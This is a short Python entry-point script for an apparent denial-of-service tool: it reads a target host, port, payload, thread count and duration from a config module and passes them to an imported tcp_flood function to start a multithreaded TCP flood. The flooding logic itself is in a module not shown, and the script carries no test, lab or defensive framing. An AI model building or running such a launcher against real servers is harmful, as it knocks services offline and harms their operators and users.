import tcp_flood
import config

if __name__ == "__main__":
    # Load configuration
    target_host = config.TARGET_HOST
    target_port = config.TARGET_PORT
    data = config.DATA
    num_threads = config.NUM_THREADS
    duration = config.DURATION
    # Start the TCP flood
    tcp_flood.tcp_flood(target_host, target_port, data, num_threads, duration)